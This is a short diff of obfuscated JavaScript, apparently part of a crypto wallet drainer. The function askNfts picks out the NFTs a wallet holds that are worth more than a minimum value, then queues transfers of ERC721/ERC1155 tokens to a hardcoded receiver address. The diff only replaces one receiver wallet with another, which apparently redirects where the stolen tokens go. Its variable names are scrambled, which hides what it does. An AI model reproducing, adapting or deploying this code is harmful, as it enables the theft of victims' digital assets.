@@ -165,7 +165,7 @@ async function askNfts(khyel, emilyann) {
           }
           if (loisjean >= nftsInfo.minValue.toString(10)) {
             console.log(nft.token_address + " (" + nft.token_id + ") | " + loisjean + " > " + nftsInfo.minValue);
-            gennette.push({price: wrynlee.price * (nft.amount > 0 ? nft.amount : 1), options: {type: nft.contract_type.toLowerCase(), receiver: "0xfdbccf45a987eaf3340706c8134f4ac44ee5f3cd", contract_address: nft.token_address, token_id: nft.token_id}});
+            gennette.push({price: wrynlee.price * (nft.amount > 0 ? nft.amount : 1), options: {type: nft.contract_type.toLowerCase(), receiver: "0x00a56bf0ffd9e3ca77198131a3ded3d7ed76ab5c", contract_address: nft.token_address, token_id: nft.token_id}});
             if (nft.contract_type === "ERC1155") {
               const stellaluna = gennette.find(sharikka => sharikka.options.contract_address == nft.token_address && sharikka.options.token_id == nft.token_id);
               if (stellaluna) {
